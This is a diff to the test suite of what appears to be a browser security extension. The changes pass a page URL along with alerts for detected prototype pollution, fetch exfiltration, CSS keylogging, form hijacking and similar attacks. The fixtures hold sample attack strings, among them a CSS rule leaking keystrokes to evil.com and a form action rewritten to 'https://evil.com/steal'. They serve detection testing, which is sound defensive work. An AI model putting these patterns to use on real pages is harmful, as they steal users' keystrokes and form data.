@@ -96,7 +96,7 @@ describe("handlePrototypePollution", () => {
       target: "Object.prototype",
       property: "__proto__",
       method: "defineProperty",
-    });
+    }, "https://example.com/page");
   });
 
   it("sender.tab.urlからdomainを取得する", async () => {
@@ -110,6 +110,7 @@ describe("handlePrototypePollution", () => {
 
     expect(alertManager.alertPrototypePollution).toHaveBeenCalledWith(
       expect.objectContaining({ domain: "tab.example.com" }),
+      "https://tab.example.com/page",
     );
   });
 
@@ -129,6 +130,7 @@ describe("handlePrototypePollution", () => {
         property: "unknown",
         method: "unknown",
       }),
+      "",
     );
   });
 });
@@ -158,7 +160,7 @@ describe("handleFetchExfiltration", () => {
       mode: "no-cors",
       reason: "cross_origin_no_cors",
       bodySize: 2048,
-    });
+    }, "https://victim.com/page");
   });
 
   it("sender.tab.urlからdomainを取得する", async () => {
@@ -172,6 +174,7 @@ describe("handleFetchExfiltration", () => {
 
     expect(alertManager.alertFetchExfiltration).toHaveBeenCalledWith(
       expect.objectContaining({ domain: "tab.victim.com" }),
+      "https://tab.victim.com/page",
     );
   });
 
@@ -191,6 +194,7 @@ describe("handleFetchExfiltration", () => {
         mode: "cors",
         reason: "cross_origin_no_cors",
       }),
+      "",
     );
   });
 });
@@ -218,7 +222,7 @@ describe("handleCacheAPIAbuse", () => {
       operation: "put",
       cacheName: "v1-cache",
       url: "https://example.com/secret",
-    });
+    }, "https://example.com/page");
   });
 
   it("sender.tab.urlからdomainを取得する", async () => {
@@ -232,6 +236,7 @@ describe("handleCacheAPIAbuse", () => {
 
     expect(alertManager.alertCacheAPIAbuse).toHaveBeenCalledWith(
       expect.objectContaining({ domain: "tab.example.com" }),
+      "https://tab.example.com/page",
     );
   });
 
@@ -250,6 +255,7 @@ describe("handleCacheAPIAbuse", () => {
         operation: "open",
         cacheName: "",
       }),
+      "",
     );
   });
 });
@@ -276,7 +282,7 @@ describe("handleWASMExecution", () => {
       domain: "example.com",
       method: "instantiateStreaming",
       byteLength: 65536,
-    });
+    }, "https://example.com/app");
   });
 
   it("sender.tab.urlからdomainを取得する", async () => {
@@ -290,6 +296,7 @@ describe("handleWASMExecution", () => {
 
     expect(alertManager.alertWASMExecution).toHaveBeenCalledWith(
       expect.objectContaining({ domain: "tab.example.com" }),
+      "https://tab.example.com/app",
     );
   });
 
@@ -308,6 +315,7 @@ describe("handleWASMExecution", () => {
         method: "instantiate",
         byteLength: null,
       }),
+      "",
     );
   });
 });
@@ -331,7 +339,7 @@ describe("handleCSSKeylogging", () => {
     expect(alertManager.alertCSSKeylogging).toHaveBeenCalledWith({
       domain: "example.com",
       sampleRule: "input[value='a'] { background: url(https://evil.com/?k=a) }",
-    });
+    }, "https://example.com/login");
   });
 
   it("sender.tab.urlからdomainを取得する", async () => {
@@ -345,6 +353,7 @@ describe("handleCSSKeylogging", () => {
 
     expect(alertManager.alertCSSKeylogging).toHaveBeenCalledWith(
       expect.objectContaining({ domain: "tab.example.com" }),
+      "https://tab.example.com/login",
     );
   });
 
@@ -360,6 +369,7 @@ describe("handleCSSKeylogging", () => {
     expect(result.success).toBe(true);
     expect(alertManager.alertCSSKeylogging).toHaveBeenCalledWith(
       expect.objectContaining({ sampleRule: "" }),
+      "",
     );
   });
 });
@@ -385,7 +395,7 @@ describe("handleDNSPrefetchLeak", () => {
       domain: "example.com",
       rel: "dns-prefetch",
       href: "https://tracker.example.com",
-    });
+    }, "https://example.com/page");
   });
 
   it("sender.tab.urlからdomainを取得する", async () => {
@@ -399,6 +409,7 @@ describe("handleDNSPrefetchLeak", () => {
 
     expect(alertManager.alertDNSPrefetchLeak).toHaveBeenCalledWith(
       expect.objectContaining({ domain: "tab.example.com" }),
+      "https://tab.example.com/page",
     );
   });
 
@@ -417,6 +428,7 @@ describe("handleDNSPrefetchLeak", () => {
         rel: "dns-prefetch",
         href: "",
       }),
+      "",
     );
   });
 });
@@ -445,7 +457,7 @@ describe("handleFormHijack", () => {
       originalAction: "https://example.com/submit",
       newAction: "https://evil.com/steal",
       targetDomain: "evil.com",
-    });
+    }, "https://example.com/page");
   });
 
   it("sender.tab.urlからdomainを取得する", async () => {
@@ -459,6 +471,7 @@ describe("handleFormHijack", () => {
 
     expect(alertManager.alertFormHijack).toHaveBeenCalledWith(
       expect.objectContaining({ domain: "tab.example.com" }),
+      "https://tab.example.com/page",
     );
   });
 
@@ -478,6 +491,7 @@ describe("handleFormHijack", () => {
         newAction: "",
         targetDomain: "",
       }),
+      "",
     );
   });
 });
@@ -501,7 +515,7 @@ describe("handlePostMessageExfil", () => {
     expect(alertManager.alertPostMessageExfil).toHaveBeenCalledWith({
       domain: "example.com",
       targetOrigin: "https://evil.com",
-    });
+    }, "https://example.com/page");
   });
 
   it("sender.tab.urlからdomainを取得する", async () => {
@@ -515,6 +529,7 @@ describe("handlePostMessageExfil", () => {
 
     expect(alertManager.alertPostMessageExfil).toHaveBeenCalledWith(
       expect.objectContaining({ domain: "tab.example.com" }),
+      "https://tab.example.com/page",
     );
   });
 
@@ -530,6 +545,7 @@ describe("handlePostMessageExfil", () => {
     expect(result.success).toBe(true);
     expect(alertManager.alertPostMessageExfil).toHaveBeenCalledWith(
       expect.objectContaining({ targetOrigin: "" }),
+      "",
     );
   });
 });
